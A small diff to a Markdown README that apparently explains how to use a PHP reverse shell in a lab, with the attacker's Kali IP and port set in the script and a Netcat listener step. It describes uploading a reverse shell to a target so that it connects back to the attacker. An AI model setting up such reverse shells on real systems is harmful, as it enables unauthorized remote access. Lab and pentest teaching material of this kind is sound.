@@ -20,15 +20,12 @@ You start a Netcat listener on your Kali machine, upload the PHP reverse shell s
 ---
 
 ## Usage Instructions
-
 Edit the `php-reverse-shell.php` file to replace the IP and port with your Kali machine details:
 
 ```php
 $ip = '192.168.237.130';  // Your Kali Linux IP address
 $port = 5555;             // Port to listen on
 
-
----
 
 ## Start the Netcat listener on Kali:
 
